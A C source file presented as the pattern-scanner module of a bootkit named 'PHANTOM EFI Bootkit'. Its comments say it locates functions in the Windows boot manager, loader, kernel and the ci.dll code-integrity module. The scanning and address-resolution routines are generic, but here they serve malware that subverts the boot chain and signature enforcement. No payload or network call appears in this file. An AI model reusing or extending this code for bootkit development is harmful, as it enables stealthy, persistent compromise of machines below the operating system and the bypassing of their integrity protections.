/*
 * PHANTOM EFI Bootkit - Pattern Scanner
 *
 * Scans memory regions for byte patterns with wildcard support.
 * Used to locate functions in bootmgfw, winload, ntoskrnl, and ci.dll.
 */

#include "bootkit.h"
#include "patterns.h"

/*
 * Scan a memory region for a byte pattern.
 * Pattern bytes are compared against the target; mask bytes of 0x00 are wildcards.
 */
VOID *BkScanPattern(VOID *Start, UINTN Size, UINT8 *Pattern, UINT8 *Mask, UINTN PatLen)
{
    if (!Start || !Pattern || !Mask || PatLen == 0 || Size < PatLen)
        return NULL;

    UINT8 *Base = (UINT8 *)Start;
    UINTN  End  = Size - PatLen;

    for (UINTN i = 0; i <= End; i++) {
        BOOLEAN Found = TRUE;

        for (UINTN j = 0; j < PatLen; j++) {
            if (Mask[j] && (Base[i + j] != Pattern[j])) {
                Found = FALSE;
                break;
            }
        }

        if (Found)
            return &Base[i];
    }

    return NULL;
}

/*
 * Scan using an IDA-style pattern string.
 * Format: "48 8B 05 ?? ?? ?? ?? 48 89"
 * '??' means wildcard byte.
 */
VOID *BkScanPatternStr(VOID *Start, UINTN Size, CHAR8 *PatternStr)
{
    UINT8 Bytes[BK_MAX_PATTERN_LEN];
    UINT8 Mask[BK_MAX_PATTERN_LEN];
    UINTN Len = 0;

    if (!BkParsePatternStr(PatternStr, Bytes, Mask, &Len))
        return NULL;

    return BkScanPattern(Start, Size, Bytes, Mask, Len);
}

/*
 * Resolve a RIP-relative address from a pattern match.
 * Given a match location and an offset to the rel32 operand,
 * compute the absolute target address.
 *
 * Used for patterns like:
 *   48 8B 05 XX XX XX XX   (mov rax, [rip+disp32])
 *   offset_to_operand = 3
 *   instruction_size = 7
 */
VOID *BkResolveRelative(VOID *InstructionAddr, UINTN OffsetToOperand, UINTN InstructionSize)
{
    UINT8 *Insn = (UINT8 *)InstructionAddr;
    INT32  Rel  = *(INT32 *)(Insn + OffsetToOperand);
    return Insn + InstructionSize + Rel;
}

/*
 * Multi-pattern scanner: tries multiple patterns and returns
 * the first match. Used when patterns differ between OS builds.
 */
VOID *BkScanMultiPattern(VOID *Start, UINTN Size, CHAR8 **Patterns, UINTN PatternCount)
{
    for (UINTN i = 0; i < PatternCount; i++) {
        VOID *Match = BkScanPatternStr(Start, Size, Patterns[i]);
        if (Match)
            return Match;
    }
    return NULL;
}
